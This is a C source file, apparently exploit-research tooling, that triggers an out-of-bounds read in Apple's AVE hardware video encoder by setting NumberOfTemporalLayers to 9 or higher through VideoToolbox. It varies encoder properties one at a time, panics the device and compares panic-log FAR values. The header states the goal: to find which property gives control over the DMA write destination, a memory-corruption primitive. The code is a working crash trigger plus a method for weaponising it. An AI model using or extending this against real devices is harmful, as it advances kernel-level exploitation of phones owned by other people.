/*
 * ave_property_scan.c — AVE DMA OOB Property Scanner
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Determine which VideoToolbox properties affect the values at
 *          struct+0x534+ (the OOB region). By changing properties and
 *          observing the panic FAR, we map which properties control the
 *          DMA write destination for OOB layers.
 *
 * Theory: The encoder session struct at +0x534 onwards contains various
 * encoder configuration values. For NTL=9, only +0x534 is read OOB.
 * The FAR in the panic log reveals the value at that offset.
 * By changing encoder properties one at a time and re-triggering,
 * we can find which property controls +0x534 and thus the DMA target.
 *
 * Modes:
 *   info        — show available test modes
 *   baseline    — NTL=9 with default props (compare FAR to original panic)
 *   bitrate_N   — set average bitrate to N before NTL=9 trigger
 *   gop_N       — set GOP/keyframe interval to N
 *   profile_N   — set H.265 profile (0=auto,1=main,2=main10)
 *   bframes_N   — set B-frame count to N
 *   entropy_N   — set entropy coding mode (0=auto,1=CABAC,2=CAVLC)
 *   qp_N        — set constant QP to N (0-51)
 *   res_WxH     — change resolution (e.g., res_640x480)
 *   pixel_N     — change pixel format (0=BGRA,1=NV12,2=P010)
 *   multi_N     — trigger NTL=N to read deeper OOB (N=9..20)
 *
 * After each crash, pull panic log and compare FAR values.
 * If FAR changes when a property changes, that property maps to the
 * OOB struct field, giving us control over the DMA destination.
 *
 * Build: see build_and_deploy.sh
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

static void set_int_prop(VTCompressionSessionRef s, CFStringRef key, int val) {
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &val);
    OSStatus st = VTSessionSetProperty(s, key, n);
    CFRelease(n);
    p("  %s = %d → %d\n", CFStringGetCStringPtr(key, kCFStringEncodingUTF8) ?: "?", val, (int)st);
}

static int trigger_with_props(int width, int height, int ntl,
                               int bitrate, int gop, int profile,
                               int bframes, int qp, int pixel_fmt_idx) {
    p("\n[*] Trigger: %dx%d NTL=%d bitrate=%d gop=%d profile=%d bframes=%d qp=%d pixfmt=%d\n",
        width, height, ntl, bitrate, gop, profile, bframes, qp, pixel_fmt_idx);

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    if (st != noErr || !session) {
        p("[-] Session create failed: %d\n", (int)st);
        return -1;
    }

    p("[*] Setting properties:\n");

    set_int_prop(session, CFSTR("EncoderUsage"), 1);
    set_int_prop(session, CFSTR("RCMode"), 20);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    p("  RealTime = false\n");

    if (bitrate > 0)
        set_int_prop(session, kVTCompressionPropertyKey_AverageBitRate, bitrate);
    if (gop > 0)
        set_int_prop(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, gop);
    if (profile > 0) {
        CFStringRef profiles[] = { NULL,
            kVTProfileLevel_HEVC_Main_AutoLevel,
            kVTProfileLevel_HEVC_Main10_AutoLevel };
        if (profile <= 2 && profiles[profile])
            VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, profiles[profile]);
        p("  ProfileLevel = %d\n", profile);
    }
    if (bframes >= 0)
        set_int_prop(session, kVTCompressionPropertyKey_MaxFrameDelayCount, bframes);
    if (qp >= 0) {
        set_int_prop(session, CFSTR("QP"), qp);
        set_int_prop(session, CFSTR("MinQP"), qp);
        set_int_prop(session, CFSTR("MaxQP"), qp);
    }

    set_int_prop(session, CFSTR("NumberOfTemporalLayers"), ntl);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        p("[-] Prepare failed: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -3;
    }

    OSType pixfmts[] = { kCVPixelFormatType_32BGRA,
                         kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                         kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange };
    OSType pixfmt = (pixel_fmt_idx >= 0 && pixel_fmt_idx <= 2)
                     ? pixfmts[pixel_fmt_idx] : kCVPixelFormatType_32BGRA;

    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(NULL, width, height, pixfmt, NULL, &pb);
    if (!pb) {
        p("[-] PixelBuffer create failed\n");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -4;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x41, CVPixelBufferGetDataSize(pb));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    p("[!] Submitting encode — NTL=%d will read OOB from struct+0x%x\n",
        ntl, 0x514 + (ntl > 8 ? 8 : ntl - 1) * 4);
    p("[!] If this panics, check FAR in panic log for OOB value\n");

    VTEncodeInfoFlags flags = 0;
    st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0,30),
                                          CMTimeMake(1,30), NULL, NULL, &flags);
    p("[+] EncodeFrame: %d (flags=0x%x)\n", (int)st, (unsigned)flags);

    if (st == noErr) {
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        p("[*] Completed without crash — silent corruption possible\n");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pb);
    return (int)st;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_propscan_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) { out = fopen("/tmp/ave_propscan.txt", "w"); }
    if (!out) return 1;

    p("=== AVE Property Scanner ===\n");
    p("Mode: %s\nPID: %d\n\n", mode, getpid());

    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("Property Scanner — vary one parameter at a time, NTL=9\n");
        p("After each panic, compare FAR to baseline to find controllable fields.\n\n");
        p("Modes:\n");
        p("  baseline     — NTL=9, default props (reference FAR)\n");
        p("  bitrate_N    — set avg bitrate (e.g., bitrate_1000000)\n");
        p("  gop_N        — set keyframe interval\n");
        p("  profile_N    — 1=main, 2=main10\n");
        p("  bframes_N    — B-frame count\n");
        p("  qp_N         — constant QP (0-51)\n");
        p("  res_WxH      — change resolution\n");
        p("  pixel_N      — 0=BGRA, 1=NV12, 2=P010\n");
        p("  multi_N      — NTL=N (9-20) to read deeper OOB\n");
        p("  safe         — NTL=2 (no OOB, sanity check)\n");
        p("\nAfter each test, pull panic log:\n");
        p("  pymobiledevice3 crash pull --udid 00008160-000A4C840E400036 /tmp/panic_logs/\n");
        p("Then compare FAR values across tests.\n");
    }
    else if (strcmp(mode, "safe") == 0) {
        trigger_with_props(1280, 720, 2, -1, -1, 0, -1, -1, 0);
    }
    else if (strcmp(mode, "baseline") == 0) {
        trigger_with_props(1280, 720, 9, -1, -1, 0, -1, -1, 0);
    }
    else if (strncmp(mode, "bitrate_", 8) == 0) {
        trigger_with_props(1280, 720, 9, atoi(mode+8), -1, 0, -1, -1, 0);
    }
    else if (strncmp(mode, "gop_", 4) == 0) {
        trigger_with_props(1280, 720, 9, -1, atoi(mode+4), 0, -1, -1, 0);
    }
    else if (strncmp(mode, "profile_", 8) == 0) {
        trigger_with_props(1280, 720, 9, -1, -1, atoi(mode+8), -1, -1, 0);
    }
    else if (strncmp(mode, "bframes_", 8) == 0) {
        trigger_with_props(1280, 720, 9, -1, -1, 0, atoi(mode+8), -1, 0);
    }
    else if (strncmp(mode, "qp_", 3) == 0) {
        trigger_with_props(1280, 720, 9, -1, -1, 0, -1, atoi(mode+3), 0);
    }
    else if (strncmp(mode, "res_", 4) == 0) {
        int w = 1280, h = 720;
        sscanf(mode+4, "%dx%d", &w, &h);
        trigger_with_props(w, h, 9, -1, -1, 0, -1, -1, 0);
    }
    else if (strncmp(mode, "pixel_", 6) == 0) {
        trigger_with_props(1280, 720, 9, -1, -1, 0, -1, -1, atoi(mode+6));
    }
    else if (strncmp(mode, "multi_", 6) == 0) {
        int ntl = atoi(mode+6);
        if (ntl < 9) ntl = 9;
        if (ntl > 100) ntl = 100;
        trigger_with_props(1280, 720, ntl, -1, -1, 0, -1, -1, 0);
    }
    else {
        p("Unknown mode: %s\n", mode);
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
